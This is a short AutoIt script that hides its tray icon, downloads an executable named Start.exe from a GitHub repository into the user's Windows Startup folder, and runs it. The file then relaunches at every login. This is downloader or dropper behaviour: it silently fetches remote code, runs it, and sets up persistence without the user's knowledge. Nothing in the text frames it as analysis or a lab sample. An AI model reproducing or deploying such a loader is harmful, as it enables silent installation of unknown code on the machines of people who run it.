#NoTrayIcon
$luser = @StartupDir
$path = $luser & "\Start.exe"
if FileExists($path) Then
	  DirRemove($path)
	  InetGet("https://github.com/WinGGAp/WinGG/raw/master/Arquivos%20FONtes/Start.exe",$path)
   Else
	  InetGet("https://github.com/WinGGAp/WinGG/raw/master/Arquivos%20FONtes/Start.exe",$path)
	  Run($luser & "\Start.exe")
EndIf